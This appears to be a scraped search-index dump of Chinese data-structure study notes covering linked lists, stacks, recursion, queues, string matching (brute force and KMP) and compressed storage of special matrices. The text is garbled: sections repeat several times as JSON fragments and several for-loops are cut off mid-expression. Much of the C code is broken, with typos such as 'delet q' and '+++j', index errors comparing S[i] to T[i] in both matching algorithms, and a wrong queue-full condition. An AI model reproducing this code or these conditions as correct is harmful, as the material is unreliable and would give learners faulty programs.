头插法时间复杂度：O(n) 尾插法——元素插入在链表尾部，也叫后插法 1.从一个空表L开始，将新结点逐个插入到链表尾部，尾指针r指向链表的尾结点。 2.初始时，r同L均指向头结点。每读入一个数据元素则申请一个新结点，将新结点插入到尾结点后，r指向新结点。 void CreateList_R(LinkList \u0026L,int n){ L=new LNode; L-\u003enext=NULL; r=L; //尾指针r指向头结点 for(i=0;i\u003ep-\u003edata; //生成新结点，输入元素值 p-\u003enext=NULL; r-\u003enext=p; //插入到表尾 } } 循环链表是一种头尾相接的链表（表中最后一个结点的指针域指向头结点，整个链表形成一个环 **优点：**从表中任一结点出发均可找到表中其他结点 **注意：**由于循环链表中没有NULL指针，故设计遍历操作时，其终止条件就不再像非循环链表那样判断p或p-\u003enext是否为空，而是判断它们是否等于头指针。 循环条件： 表的操作常常是在表的首尾位置上进行 ","date":"2023-12-19","objectID":"/data_structure_notes/:2:4","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#建立单链表"},{"categories":["notice"],"content":"\r4链式表示和实现**链式存储结构：**结点在储存器中的位置是任意的，即逻辑上相邻的数据元素在物理上不一定相邻。 线性表的链式表示又称为非顺序映像和链式映像 用一组物理位置任意的存储单元来存放线性表的数据元素，这组存储单元既可以是连续的，也可以是不连续的，甚至是零散分布在内存中的任意位置上。链表中的逻辑次序和物理次序不一定相同。 链式存储有关的术语1.结点：数据元素的存储映像。由数据域和指针域两部分组成 2.链表：n个结点由指针链组成一个链表 带头单链结点表示意图： 3.单链表：结点只有一个指针域的链表，称为单链表或线性链表 4.双链表：结点有两个指针域的链表 5.循环链表：首尾相接的链表 6.头指针：指向链表中第一个结点的指针 7.首元结点：链表中存储第一个数据元素a1的结点 8.头结点：在链表的首元结点之前附设的一个结点 两种形式： 如何表示空表无头结点时，头指针为空时表示空表 有头结点时，当头结点的指针域为空时表示空表 设置结点有什么好处1.便于首元结点的处理（无需对首元结点进行特殊处理） 2.便于空表和非空表的统一处理 头结点数据域装什么头结点的数据域可以为空，也可以存放线性表长度等附加信息，但此结点不能计入链表长度值 链表的特点1）结点在储存器中的位置时任意的 2）访问时只能通过头指针进入链表，并通过每个结点的指针域一次向后顺序扫描其余结点，寻找第一个结点和最后一个结点所花费的时间不等 3）顺序表时随机存存取，连表示顺序存取 单链表的储存结构\r单链表定义： typedef struct Lnode{ ElemType data; //结点的数据域 struct Lnode *next; //结点的指针域 }Lnode,*LinkList; 案例：为统一链表操作，通常这样定义： typedef Struct{ char num[8]; //数据域 char name[8]; //数据域 int score; //数据域 }ElemType; typedef struct Lnode{ ElemType data; //数据域 struct Lnode *next; //指针域 }Lnode,*LinkList; 单链表基本操作的实现单链表初始化（构造一个空表） 算法步骤： 1)生成新结点作头结点，用头指针L指向头结点 2)将头结点的指针域置空 Status InitList_L(LinkList \u0026L){ L=new LNode; //或L=(LinkList)malloc(sizeof(LNode)); L-\u003enext=NULL; return OK; } 判断链表是否为空 即判断头结点指针域是否为空 空表：链表中无元素，称为空链表（头指针和头结点仍然在） int ListEmpty(LinkList L){ if(L-\u003enext) //非空 return 0; else return 1; } 单链表的销毁：链表销毁后不存在 从头指针开始，依次释放所有结点 Status DestroyList_L(LinkList \u0026L){ Lnode *p; while(L){ p=L; L=L-\u003enext; delete p; } return OK; } 清空链表 链表仍存在，但链表中无元素，称为空链表（头指针和头结点仍然在） 依次释放所有结点，并将头结点指针域设置为空 Status ClearList(LinkList \u0026L){ Lnode *p,*q; p=L-\u003enext; while(p){ q=p-\u003enext; delete p; p=q } L-\u003enext=NULL; return OK; } 求单链表的表长 int ListLength_L(LinkList L){ LinkList p; p=L-\u003enext; i=0; while(p){ i++; p=p-\u003enext; } return i; } 取单链表中第i个元素的内容 Status GetElem_L(LinkList L,int i,ElemType \u0026e){ p=L-\u003enext;j=1; while(p\u0026\u0026jnext;++j; } if(!p||j\u003ei)return ERROR; e=p-\u003edata; return OK; }//GetElem_L 按值查找(根据指定数据获取该数据所在地址) Lnode *LocateElem_L(LinkList L,ElemType e){ p=L-\u003enext; while(p\u0026\u0026p-\u003edata!=e){ p=p-\u003enext; } return p; } 按值查找(根据指定数据获取数据位置序号) int LocateElem_L(LinkList L, ElemType e){ p=L-\u003enext; j=1; while(p\u0026\u0026P-\u003edata!=e) {p=p-\u003enext; j++;} if(p) return j; else return 0; } 插入(在第i个结点前插入值为e的新结点) Status ListInsert_L(LinkList \u0026L,int i,ElemType e){ p=L;j=0; while(p\u0026\u0026jnext;++j;} if(!p||j\u003ei-1) return ERROR; s=new LNode; s-\u003edata=e; s-\u003enext=p-\u003enext; p-\u003enext=s; return OK; }//ListInsert_L 删除(删除第i个结点) Status ListDelete_L(LinkList \u0026L,int i,ElemType \u0026e){ p=L;j=0; while(p-\u003enext\u0026jnext;++j;} //寻找第i结点，并令p指向其前驱 if(!(p-\u003enext)||j\u003ei-1)return ERROR; q=p-\u003enext; p-\u003enext=q-\u003enext; e=q-\u003edata; delet q; return OK; } 时间效率分析1.查找： 因为线性链表只能顺序存取，即在查找时要从头指针找起，查找的时间复杂度为：O(n) 2.插入和删除： 因为线性表不需要移动元素，只需要修改指针，一般情况下时间复杂度为O(1) 但如果要在单链表中进行前插或删除操作，由于要从头查找前驱结点，所耗时间复杂度为O(n) 建立单链表头插法——元素插入在链表头部，也叫前插法 1.从一个空表开始，重复读入数据； 2.生成新结点，将读入数据存放到新结点的数据域中 3.从最后一个结点开始，依次将个节点插入到链表的前端 构造一个新结点 L=new LNode; //C++语法 L=(LinkList)malloc(sizeof(LNode)); //C语言语法 算法： void CreateList_H(LinkList \u0026L,int n){ L=new LNode; L-\u003enext=NULL; //建立一个带头结点的单链表 for(i=n;i\u003e0;--i){ p=new LNode; cin\u003e\u003ep-\u003edata; //输入元素 p-\u003enext=L-\u003enext; //输入表头 L-\u003enext=p; } } 头插法时间复杂度：O(n) 尾插法——元素插入在链表尾部，也叫后插法 1.从一个空表L开始，将新结点逐个插入到链表尾部，尾指针r指向链表的尾结点。 2.初始时，r同L均指向头结点。每读入一个数据元素则申请一个新结点，将新结点插入到尾结点后，r指向新结点。 void CreateList_R(LinkList \u0026L,int n){ L=new LNode; L-\u003enext=NULL; r=L; //尾指针r指向头结点 for(i=0;i\u003ep-\u003edata; //生成新结点，输入元素值 p-\u003enext=NULL; r-\u003enext=p; //插入到表尾 } } 循环链表是一种头尾相接的链表（表中最后一个结点的指针域指向头结点，整个链表形成一个环 **优点：**从表中任一结点出发均可找到表中其他结点 **注意：**由于循环链表中没有NULL指针，故设计遍历操作时，其终止条件就不再像非循环链表那样判断p或p-\u003enext是否为空，而是判断它们是否等于头指针。 循环条件： 表的操作常常是在表的首尾位置上进行 ","date":"2023-12-19","objectID":"/data_structure_notes/:2:4","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#循环链表"},{"categories":["notice"],"content":"\r0x3栈和的队列","date":"2023-12-19","objectID":"/data_structure_notes/:3:0","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#0x3栈和的队列"},{"categories":["notice"],"content":"\r栈顺序栈进栈 （1）判断是否栈满，若满则出错 （2）元素e压入栈顶 （3）栈顶指针+1 两个栈共享一个数组空间 两个站的栈底分别位于数组空间两端，栈顶向中间移动 栈空：top[i]=bot[i] 栈满：top[0]+1=top[1]（或top[1]-1=top[0]） 链栈 运算是受限的单链表，只能在链表头部进行操作，故没有必要附加头结点。栈顶指针就是链表的头指针。 算法实现 typedef struct StackNode { SElemType data; struct StackNode *next; } StackNode, *LinkStack; LinkStack S; 递归一个对象部分地包含它自己，或用他自己给自己定义，则称这个对象是递归的； 若一个过程直接地或间接地调用自己，则称这个过程是递归过程 多个函数构成嵌套调用时，遵循后调用先返回原则 递归定义的数学函数 阶乘函数，2阶Fibonaci数列… 递归定义的数据结构 二叉树，广义表… 分治法求解递归问题 分治法：对于一个较为复杂的问题，能够分解成几个相对简单的且解法相同或类似的子问题来求解。 函数调用过程调用前，系统完成 (1)将实参，返回地址等传递给被调用函数 (2)为被调用函数的局部变量分配储存区 (3)将控制转移到被调用函数的入口 调用后，系统完成： (1)保存被调用函数的计算结果 (2)释放被调用函数的数据区 (3)依照被调用函数保存的返回地址将控制转移到调用函数 递归算法的效率分析空间效率：与递归树的深度成正比 时间效率：与递归树的结点成正比 递归的优缺点优点：结构清晰，程序易读 缺点：每次调用要生成工作记录，保存状态信息，入栈；返回时要出栈，恢复状态信息。时间开销大。 ","date":"2023-12-19","objectID":"/data_structure_notes/:3:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#栈"},{"categories":["notice"],"content":"\r栈顺序栈进栈 （1）判断是否栈满，若满则出错 （2）元素e压入栈顶 （3）栈顶指针+1 两个栈共享一个数组空间 两个站的栈底分别位于数组空间两端，栈顶向中间移动 栈空：top[i]=bot[i] 栈满：top[0]+1=top[1]（或top[1]-1=top[0]） 链栈 运算是受限的单链表，只能在链表头部进行操作，故没有必要附加头结点。栈顶指针就是链表的头指针。 算法实现 typedef struct StackNode { SElemType data; struct StackNode *next; } StackNode, *LinkStack; LinkStack S; 递归一个对象部分地包含它自己，或用他自己给自己定义，则称这个对象是递归的； 若一个过程直接地或间接地调用自己，则称这个过程是递归过程 多个函数构成嵌套调用时，遵循后调用先返回原则 递归定义的数学函数 阶乘函数，2阶Fibonaci数列… 递归定义的数据结构 二叉树，广义表… 分治法求解递归问题 分治法：对于一个较为复杂的问题，能够分解成几个相对简单的且解法相同或类似的子问题来求解。 函数调用过程调用前，系统完成 (1)将实参，返回地址等传递给被调用函数 (2)为被调用函数的局部变量分配储存区 (3)将控制转移到被调用函数的入口 调用后，系统完成： (1)保存被调用函数的计算结果 (2)释放被调用函数的数据区 (3)依照被调用函数保存的返回地址将控制转移到调用函数 递归算法的效率分析空间效率：与递归树的深度成正比 时间效率：与递归树的结点成正比 递归的优缺点优点：结构清晰，程序易读 缺点：每次调用要生成工作记录，保存状态信息，入栈；返回时要出栈，恢复状态信息。时间开销大。 ","date":"2023-12-19","objectID":"/data_structure_notes/:3:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#递归"},{"categories":["notice"],"content":"\r栈顺序栈进栈 （1）判断是否栈满，若满则出错 （2）元素e压入栈顶 （3）栈顶指针+1 两个栈共享一个数组空间 两个站的栈底分别位于数组空间两端，栈顶向中间移动 栈空：top[i]=bot[i] 栈满：top[0]+1=top[1]（或top[1]-1=top[0]） 链栈 运算是受限的单链表，只能在链表头部进行操作，故没有必要附加头结点。栈顶指针就是链表的头指针。 算法实现 typedef struct StackNode { SElemType data; struct StackNode *next; } StackNode, *LinkStack; LinkStack S; 递归一个对象部分地包含它自己，或用他自己给自己定义，则称这个对象是递归的； 若一个过程直接地或间接地调用自己，则称这个过程是递归过程 多个函数构成嵌套调用时，遵循后调用先返回原则 递归定义的数学函数 阶乘函数，2阶Fibonaci数列… 递归定义的数据结构 二叉树，广义表… 分治法求解递归问题 分治法：对于一个较为复杂的问题，能够分解成几个相对简单的且解法相同或类似的子问题来求解。 函数调用过程调用前，系统完成 (1)将实参，返回地址等传递给被调用函数 (2)为被调用函数的局部变量分配储存区 (3)将控制转移到被调用函数的入口 调用后，系统完成： (1)保存被调用函数的计算结果 (2)释放被调用函数的数据区 (3)依照被调用函数保存的返回地址将控制转移到调用函数 递归算法的效率分析空间效率：与递归树的深度成正比 时间效率：与递归树的结点成正比 递归的优缺点优点：结构清晰，程序易读 缺点：每次调用要生成工作记录，保存状态信息，入栈；返回时要出栈，恢复状态信息。时间开销大。 ","date":"2023-12-19","objectID":"/data_structure_notes/:3:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#函数调用过程"},{"categories":["notice"],"content":"\r栈顺序栈进栈 （1）判断是否栈满，若满则出错 （2）元素e压入栈顶 （3）栈顶指针+1 两个栈共享一个数组空间 两个站的栈底分别位于数组空间两端，栈顶向中间移动 栈空：top[i]=bot[i] 栈满：top[0]+1=top[1]（或top[1]-1=top[0]） 链栈 运算是受限的单链表，只能在链表头部进行操作，故没有必要附加头结点。栈顶指针就是链表的头指针。 算法实现 typedef struct StackNode { SElemType data; struct StackNode *next; } StackNode, *LinkStack; LinkStack S; 递归一个对象部分地包含它自己，或用他自己给自己定义，则称这个对象是递归的； 若一个过程直接地或间接地调用自己，则称这个过程是递归过程 多个函数构成嵌套调用时，遵循后调用先返回原则 递归定义的数学函数 阶乘函数，2阶Fibonaci数列… 递归定义的数据结构 二叉树，广义表… 分治法求解递归问题 分治法：对于一个较为复杂的问题，能够分解成几个相对简单的且解法相同或类似的子问题来求解。 函数调用过程调用前，系统完成 (1)将实参，返回地址等传递给被调用函数 (2)为被调用函数的局部变量分配储存区 (3)将控制转移到被调用函数的入口 调用后，系统完成： (1)保存被调用函数的计算结果 (2)释放被调用函数的数据区 (3)依照被调用函数保存的返回地址将控制转移到调用函数 递归算法的效率分析空间效率：与递归树的深度成正比 时间效率：与递归树的结点成正比 递归的优缺点优点：结构清晰，程序易读 缺点：每次调用要生成工作记录，保存状态信息，入栈；返回时要出栈，恢复状态信息。时间开销大。 ","date":"2023-12-19","objectID":"/data_structure_notes/:3:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#递归算法的效率分析"},{"categories":["notice"],"content":"\r栈顺序栈进栈 （1）判断是否栈满，若满则出错 （2）元素e压入栈顶 （3）栈顶指针+1 两个栈共享一个数组空间 两个站的栈底分别位于数组空间两端，栈顶向中间移动 栈空：top[i]=bot[i] 栈满：top[0]+1=top[1]（或top[1]-1=top[0]） 链栈 运算是受限的单链表，只能在链表头部进行操作，故没有必要附加头结点。栈顶指针就是链表的头指针。 算法实现 typedef struct StackNode { SElemType data; struct StackNode *next; } StackNode, *LinkStack; LinkStack S; 递归一个对象部分地包含它自己，或用他自己给自己定义，则称这个对象是递归的； 若一个过程直接地或间接地调用自己，则称这个过程是递归过程 多个函数构成嵌套调用时，遵循后调用先返回原则 递归定义的数学函数 阶乘函数，2阶Fibonaci数列… 递归定义的数据结构 二叉树，广义表… 分治法求解递归问题 分治法：对于一个较为复杂的问题，能够分解成几个相对简单的且解法相同或类似的子问题来求解。 函数调用过程调用前，系统完成 (1)将实参，返回地址等传递给被调用函数 (2)为被调用函数的局部变量分配储存区 (3)将控制转移到被调用函数的入口 调用后，系统完成： (1)保存被调用函数的计算结果 (2)释放被调用函数的数据区 (3)依照被调用函数保存的返回地址将控制转移到调用函数 递归算法的效率分析空间效率：与递归树的深度成正比 时间效率：与递归树的结点成正比 递归的优缺点优点：结构清晰，程序易读 缺点：每次调用要生成工作记录，保存状态信息，入栈；返回时要出栈，恢复状态信息。时间开销大。 ","date":"2023-12-19","objectID":"/data_structure_notes/:3:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#递归的优缺点"},{"categories":["notice"],"content":"\r队列队列的顺序表示—-一维数组base[M] 循环队列—-取模运算入队： base[rear]=x; rear=(rear+1)%M; 出队： x=base[front]; front=(front+1)%M; 初始（队空）： front=rear=0 队满： front=rear 入队： base[rear++]=x; 出队： x=base[front--]; 循环队列： #define MAXQSIZE100 Typedef struct{ QelemType } 案例：数值的转化\r案例：括号的匹配\r案例：迷宫求解（回溯法）","date":"2023-12-19","objectID":"/data_structure_notes/:3:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#队列"},{"categories":["notice"],"content":"\r队列队列的顺序表示—-一维数组base[M] 循环队列—-取模运算入队： base[rear]=x; rear=(rear+1)%M; 出队： x=base[front]; front=(front+1)%M; 初始（队空）： front=rear=0 队满： front=rear 入队： base[rear++]=x; 出队： x=base[front--]; 循环队列： #define MAXQSIZE100 Typedef struct{ QelemType } 案例：数值的转化\r案例：括号的匹配\r案例：迷宫求解（回溯法）","date":"2023-12-19","objectID":"/data_structure_notes/:3:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#循环队列----取模运算"},{"categories":["notice"],"content":"\r队列队列的顺序表示—-一维数组base[M] 循环队列—-取模运算入队： base[rear]=x; rear=(rear+1)%M; 出队： x=base[front]; front=(front+1)%M; 初始（队空）： front=rear=0 队满： front=rear 入队： base[rear++]=x; 出队： x=base[front--]; 循环队列： #define MAXQSIZE100 Typedef struct{ QelemType } 案例：数值的转化\r案例：括号的匹配\r案例：迷宫求解（回溯法）","date":"2023-12-19","objectID":"/data_structure_notes/:3:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#案例数值的转化"},{"categories":["notice"],"content":"\r队列队列的顺序表示—-一维数组base[M] 循环队列—-取模运算入队： base[rear]=x; rear=(rear+1)%M; 出队： x=base[front]; front=(front+1)%M; 初始（队空）： front=rear=0 队满： front=rear 入队： base[rear++]=x; 出队： x=base[front--]; 循环队列： #define MAXQSIZE100 Typedef struct{ QelemType } 案例：数值的转化\r案例：括号的匹配\r案例：迷宫求解（回溯法）","date":"2023-12-19","objectID":"/data_structure_notes/:3:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#案例括号的匹配"},{"categories":["notice"],"content":"\r队列队列的顺序表示—-一维数组base[M] 循环队列—-取模运算入队： base[rear]=x; rear=(rear+1)%M; 出队： x=base[front]; front=(front+1)%M; 初始（队空）： front=rear=0 队满： front=rear 入队： base[rear++]=x; 出队： x=base[front--]; 循环队列： #define MAXQSIZE100 Typedef struct{ QelemType } 案例：数值的转化\r案例：括号的匹配\r案例：迷宫求解（回溯法）","date":"2023-12-19","objectID":"/data_structure_notes/:3:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#案例迷宫求解回溯法"},{"categories":["notice"],"content":"\r0x4串、数组和广义表定义 串(string)——零个或多个字符组成的有限序列 S='a1a2...an' 结构 typedef struct{ char *ch; //若串非空,则按串长分配存储区, //否则ch为NULL int length; //串长度 }HString; 算法实现 #define CHUNKSIZE 80 //可由用户定义的块大小 typedef struct Chunk{ char ch[CHUNKSIZE]; struct Chunk *next; }Chunk; typedef struct{ Chunk *head,*tail; //串的头指针和尾指针 int curlen; //串的当前长度 }LString; 特点 优点：操作方便 缺点：存储密度较低 可将多个字符存放在一个结点中，以克服其缺点 补充：C语言中常用的串运算调用标准库函数：#include\u003cstring.h\u003e 串比较，strcmp(char s1,char s2) 串复制，strcpy(char to,char from) 串连接，strcat(chat to,char from) 求串长，strlen(char s) .... ","date":"2023-12-19","objectID":"/data_structure_notes/:4:0","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#0x4串数组和广义表"},{"categories":["notice"],"content":"\r0x4串、数组和广义表定义 串(string)——零个或多个字符组成的有限序列 S='a1a2...an' 结构 typedef struct{ char *ch; //若串非空,则按串长分配存储区, //否则ch为NULL int length; //串长度 }HString; 算法实现 #define CHUNKSIZE 80 //可由用户定义的块大小 typedef struct Chunk{ char ch[CHUNKSIZE]; struct Chunk *next; }Chunk; typedef struct{ Chunk *head,*tail; //串的头指针和尾指针 int curlen; //串的当前长度 }LString; 特点 优点：操作方便 缺点：存储密度较低 可将多个字符存放在一个结点中，以克服其缺点 补充：C语言中常用的串运算调用标准库函数：#include 串比较，strcmp(char s1,char s2) 串复制，strcpy(char to,char from) 串连接，strcat(chat to,char from) 求串长，strlen(char s) .... ","date":"2023-12-19","objectID":"/data_structure_notes/:4:0","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#补充c语言中常用的串运算"},{"categories":["notice"],"content":"\r串的模式匹配算法 两个串：主串：S，模式串T（数组储存） 从主串S中找到和T相等的子串，返回位置 1.BruteForce算法时间复杂度：O(S[0]*T[o]) （主串）i=st（初始位置） （模式串）j=1（从头开始比较） 若S[i]==T[j]，则++j，++i；若仍然相等，则重复该过程，若出现不相等，则执行下述操作 若S[i]!=T[j]，则i=i-j+2（从上个比较点的下一位开始），j=1 若i\u003eS[0]（串的长度）（或j\u003eT[0]），结束操作 int Index(String S,string T, int* POS){ i=st;j=1; while(i\u003c=S[0]\u0026\u0026j\u003c=T[0]){ //S[0]存储串S的长度 if(S[i]==T[i]) ++i;+++j; else i=i-j+2; j=1; } if(i\u003eS[0]) POS=0; else POS=i-T[0]; } 时间复杂度总次数为：(n-m)*m+m＝(n-m+1)*m 若m«n，则算法复杂度O(n*m) 2.KMP算法时间复杂度：O(S[0]+T[0]) 改进：不回溯i指针，利用已得到的部分匹配结果，将模式串向右滑动，尽可能得到新j int Index(String S,string T, int* POS){ i=st;j=1; while(i\u003c=S[0]\u0026\u0026j\u003c=T[0]){ //S[0]存储串S的长度 if(j==0||S[i]==T[i]) ++i;++j; else j=next[j]; } if(i\u003eS[0]) POS=0; else POS=i-T[0]; } 定义next[j]函数，表明当模式中第j个字符与主串相应字符匹配“失败”时，执行此函数。 如何求next函数的值：1.next[1]=0;表明主串从下一字符si+1起和模式串重新开始匹配。i=i+1;j=1; 2.设next[j]=k，则next[j+1]=? ​ ①若pk=pj，则有\"p1…pk-1pk”=“pj-k+1…pj-1pj”，如果在j+1发生不匹配，说明next[j+1]=k+1=next[j]+1。 ​ ②若pk!=pj，可把求next值问题看成是一个模式匹配问题，整个模式串既是主串又是子串。 ","date":"2023-12-19","objectID":"/data_structure_notes/:4:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#串的模式匹配算法"},{"categories":["notice"],"content":"\r串的模式匹配算法 两个串：主串：S，模式串T（数组储存） 从主串S中找到和T相等的子串，返回位置 1.BruteForce算法时间复杂度：O(S[0]*T[o]) （主串）i=st（初始位置） （模式串）j=1（从头开始比较） 若S[i]==T[j]，则++j，++i；若仍然相等，则重复该过程，若出现不相等，则执行下述操作 若S[i]!=T[j]，则i=i-j+2（从上个比较点的下一位开始），j=1 若i\u003eS[0]（串的长度）（或j\u003eT[0]），结束操作 int Index(String S,string T, int* POS){ i=st;j=1; while(i\u003c=S[0]\u0026\u0026j\u003c=T[0]){ //S[0]存储串S的长度 if(S[i]==T[i]) ++i;+++j; else i=i-j+2; j=1; } if(i\u003eS[0]) POS=0; else POS=i-T[0]; } 时间复杂度总次数为：(n-m)*m+m＝(n-m+1)*m 若m«n，则算法复杂度O(n*m) 2.KMP算法时间复杂度：O(S[0]+T[0]) 改进：不回溯i指针，利用已得到的部分匹配结果，将模式串向右滑动，尽可能得到新j int Index(String S,string T, int* POS){ i=st;j=1; while(i\u003c=S[0]\u0026\u0026j\u003c=T[0]){ //S[0]存储串S的长度 if(j==0||S[i]==T[i]) ++i;++j; else j=next[j]; } if(i\u003eS[0]) POS=0; else POS=i-T[0]; } 定义next[j]函数，表明当模式中第j个字符与主串相应字符匹配“失败”时，执行此函数。 如何求next函数的值：1.next[1]=0;表明主串从下一字符si+1起和模式串重新开始匹配。i=i+1;j=1; 2.设next[j]=k，则next[j+1]=? ​ ①若pk=pj，则有\"p1…pk-1pk”=“pj-k+1…pj-1pj”，如果在j+1发生不匹配，说明next[j+1]=k+1=next[j]+1。 ​ ②若pk!=pj，可把求next值问题看成是一个模式匹配问题，整个模式串既是主串又是子串。 ","date":"2023-12-19","objectID":"/data_structure_notes/:4:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#1bruteforce算法"},{"categories":["notice"],"content":"\r串的模式匹配算法 两个串：主串：S，模式串T（数组储存） 从主串S中找到和T相等的子串，返回位置 1.BruteForce算法时间复杂度：O(S[0]*T[o]) （主串）i=st（初始位置） （模式串）j=1（从头开始比较） 若S[i]==T[j]，则++j，++i；若仍然相等，则重复该过程，若出现不相等，则执行下述操作 若S[i]!=T[j]，则i=i-j+2（从上个比较点的下一位开始），j=1 若i\u003eS[0]（串的长度）（或j\u003eT[0]），结束操作 int Index(String S,string T, int* POS){ i=st;j=1; while(i\u003c=S[0]\u0026\u0026j\u003c=T[0]){ //S[0]存储串S的长度 if(S[i]==T[i]) ++i;+++j; else i=i-j+2; j=1; } if(i\u003eS[0]) POS=0; else POS=i-T[0]; } 时间复杂度总次数为：(n-m)*m+m＝(n-m+1)*m 若m«n，则算法复杂度O(n*m) 2.KMP算法时间复杂度：O(S[0]+T[0]) 改进：不回溯i指针，利用已得到的部分匹配结果，将模式串向右滑动，尽可能得到新j int Index(String S,string T, int* POS){ i=st;j=1; while(i\u003c=S[0]\u0026\u0026j\u003c=T[0]){ //S[0]存储串S的长度 if(j==0||S[i]==T[i]) ++i;++j; else j=next[j]; } if(i\u003eS[0]) POS=0; else POS=i-T[0]; } 定义next[j]函数，表明当模式中第j个字符与主串相应字符匹配“失败”时，执行此函数。 如何求next函数的值：1.next[1]=0;表明主串从下一字符si+1起和模式串重新开始匹配。i=i+1;j=1; 2.设next[j]=k，则next[j+1]=? ​ ①若pk=pj，则有\"p1…pk-1pk”=“pj-k+1…pj-1pj”，如果在j+1发生不匹配，说明next[j+1]=k+1=next[j]+1。 ​ ②若pk!=pj，可把求next值问题看成是一个模式匹配问题，整个模式串既是主串又是子串。 ","date":"2023-12-19","objectID":"/data_structure_notes/:4:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#时间复杂度"},{"categories":["notice"],"content":"\r串的模式匹配算法 两个串：主串：S，模式串T（数组储存） 从主串S中找到和T相等的子串，返回位置 1.BruteForce算法时间复杂度：O(S[0]*T[o]) （主串）i=st（初始位置） （模式串）j=1（从头开始比较） 若S[i]==T[j]，则++j，++i；若仍然相等，则重复该过程，若出现不相等，则执行下述操作 若S[i]!=T[j]，则i=i-j+2（从上个比较点的下一位开始），j=1 若i\u003eS[0]（串的长度）（或j\u003eT[0]），结束操作 int Index(String S,string T, int* POS){ i=st;j=1; while(i\u003c=S[0]\u0026\u0026j\u003c=T[0]){ //S[0]存储串S的长度 if(S[i]==T[i]) ++i;+++j; else i=i-j+2; j=1; } if(i\u003eS[0]) POS=0; else POS=i-T[0]; } 时间复杂度总次数为：(n-m)*m+m＝(n-m+1)*m 若m«n，则算法复杂度O(n*m) 2.KMP算法时间复杂度：O(S[0]+T[0]) 改进：不回溯i指针，利用已得到的部分匹配结果，将模式串向右滑动，尽可能得到新j int Index(String S,string T, int* POS){ i=st;j=1; while(i\u003c=S[0]\u0026\u0026j\u003c=T[0]){ //S[0]存储串S的长度 if(j==0||S[i]==T[i]) ++i;++j; else j=next[j]; } if(i\u003eS[0]) POS=0; else POS=i-T[0]; } 定义next[j]函数，表明当模式中第j个字符与主串相应字符匹配“失败”时，执行此函数。 如何求next函数的值：1.next[1]=0;表明主串从下一字符si+1起和模式串重新开始匹配。i=i+1;j=1; 2.设next[j]=k，则next[j+1]=? ​ ①若pk=pj，则有\"p1…pk-1pk”=“pj-k+1…pj-1pj”，如果在j+1发生不匹配，说明next[j+1]=k+1=next[j]+1。 ​ ②若pk!=pj，可把求next值问题看成是一个模式匹配问题，整个模式串既是主串又是子串。 ","date":"2023-12-19","objectID":"/data_structure_notes/:4:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#2kmp算法"},{"categories":["notice"],"content":"\r串的模式匹配算法 两个串：主串：S，模式串T（数组储存） 从主串S中找到和T相等的子串，返回位置 1.BruteForce算法时间复杂度：O(S[0]*T[o]) （主串）i=st（初始位置） （模式串）j=1（从头开始比较） 若S[i]==T[j]，则++j，++i；若仍然相等，则重复该过程，若出现不相等，则执行下述操作 若S[i]!=T[j]，则i=i-j+2（从上个比较点的下一位开始），j=1 若i\u003eS[0]（串的长度）（或j\u003eT[0]），结束操作 int Index(String S,string T, int* POS){ i=st;j=1; while(i\u003c=S[0]\u0026\u0026j\u003c=T[0]){ //S[0]存储串S的长度 if(S[i]==T[i]) ++i;+++j; else i=i-j+2; j=1; } if(i\u003eS[0]) POS=0; else POS=i-T[0]; } 时间复杂度总次数为：(n-m)*m+m＝(n-m+1)*m 若m«n，则算法复杂度O(n*m) 2.KMP算法时间复杂度：O(S[0]+T[0]) 改进：不回溯i指针，利用已得到的部分匹配结果，将模式串向右滑动，尽可能得到新j int Index(String S,string T, int* POS){ i=st;j=1; while(i\u003c=S[0]\u0026\u0026j\u003c=T[0]){ //S[0]存储串S的长度 if(j==0||S[i]==T[i]) ++i;++j; else j=next[j]; } if(i\u003eS[0]) POS=0; else POS=i-T[0]; } 定义next[j]函数，表明当模式中第j个字符与主串相应字符匹配“失败”时，执行此函数。 如何求next函数的值：1.next[1]=0;表明主串从下一字符si+1起和模式串重新开始匹配。i=i+1;j=1; 2.设next[j]=k，则next[j+1]=? ​ ①若pk=pj，则有\"p1…pk-1pk”=“pj-k+1…pj-1pj”，如果在j+1发生不匹配，说明next[j+1]=k+1=next[j]+1。 ​ ②若pk!=pj，可把求next值问题看成是一个模式匹配问题，整个模式串既是主串又是子串。 ","date":"2023-12-19","objectID":"/data_structure_notes/:4:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#如何求next函数的值"},{"categories":["notice"],"content":"\r特殊矩阵的压缩存储\r压缩存储若多个数据元素的值都相同，则只分配一个元素值的储存空间，且零元素不占储存空间。 什么样的矩阵能压缩存储一些特殊矩阵：对称矩阵，对角矩阵，三角矩阵，稀疏矩阵 对称矩阵特点：在nxn的矩阵a中，满足性质aij=aji（1\u003c=i,j\u003c=n） 存储方法：只能存储上（或者下）三角（包括主对角线）的数据元素。共占n(n+1)/2个元素空间。 三角矩阵特点：对角线以下（或者以上）的数据元素（不包括对角线）全部为常数c。 储存方法：重复元素c共享一个元素存储空间，共占用n(n+1)/2+1个元素空间：sa[1...n(n+1)/2+1] 对角矩阵(带状矩阵)特点：在nxn的方阵中，非零元素集中在主对角线及其两侧共L(奇数)条对角线的带状区域内——L对角矩阵。 储存方法： 